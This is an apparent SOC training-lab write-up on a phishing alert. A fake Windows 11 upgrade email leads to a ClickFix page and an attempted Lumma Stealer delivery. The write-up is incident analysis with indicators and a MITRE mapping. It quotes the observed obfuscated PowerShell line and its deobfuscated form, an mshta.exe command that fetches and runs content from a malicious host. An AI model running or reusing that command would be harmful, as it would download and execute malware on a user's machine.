# 🚨 SOC338 - Lumma Stealer - DLL Side-Loading via Click Fix Phishing

## 📌 Summary

A phishing email offering a free Windows 11 Pro upgrade was delivered to an internal user. The user clicked the embedded link and was redirected to a ClickFix phishing page that executed an obfuscated PowerShell command. The command launched **mshta.exe** and attempted to retrieve remote content from a suspicious domain associated with Lumma Stealer distribution.

---

## 🧾 Alert Details

| Field | Value |
|---------|---------|
| Alert ID | SOC338 |
| Event ID | 316 |
| Category | Phishing |
| Severity | Critical |
| Sender | update@windows-update.site |
| Recipient | dylan@letsdefend.io |
| SMTP IP | 132.232.40.201 |
| Subject | Upgrade your system to Windows 11 Pro for FREE |

---

## 🔍 Investigation

### Key Findings

- Phishing email successfully delivered
- User clicked malicious URL
- Redirection to ClickFix phishing page
- Obfuscated PowerShell command identified
- mshta.exe executed through PowerShell
- External suspicious domain contacted
- Activity matched Lumma Stealer delivery techniques

### Observed Command

```powershell
('ms]]]ht]]]a]]].]]]exe https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4' -replace ']')
```

### Deobfuscated Command

```cmd
mshta.exe https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4
```

---

## 🔗 Indicators of Compromise (IOCs)

| Type | Indicator |
|---------|---------|
| Sender | update@windows-update.site |
| SMTP IP | 132.232.40.201 |
| Domain | overcoatpassably.shop |
| URL | windows-update.site |
| Malware Family | Lumma Stealer |

---

## 🧠 MITRE ATT&CK Mapping

| Technique | Description |
|------------|------------|
| T1566.002 | Phishing: Spearphishing Link |
| T1204 | User Execution |
| T1059.001 | PowerShell |
| T1027 | Obfuscated Files or Information |
| T1218.005 | Mshta |

---

## 🛠️ Response Actions

- Confirmed phishing email delivery
- Validated user interaction with malicious URL
- Analyzed PowerShell execution
- Identified command obfuscation technique
- Confirmed execution of mshta.exe
- Validated malicious infrastructure association
- Classified alert as True Positive

---

## 📚 Conclusion

The investigation confirmed a phishing campaign leveraging a ClickFix social engineering technique. The victim accessed a malicious webpage and executed an obfuscated PowerShell command that launched **mshta.exe** and connected to an external suspicious domain associated with Lumma Stealer distribution.

## ✅ Final Verdict

**True Positive**

## 🎯 Classification

**Phishing / ClickFix / Lumma Stealer Delivery**

---

⭐ SOC investigation completed following the workflow:

**Detection → Analysis → Threat Validation → Response**
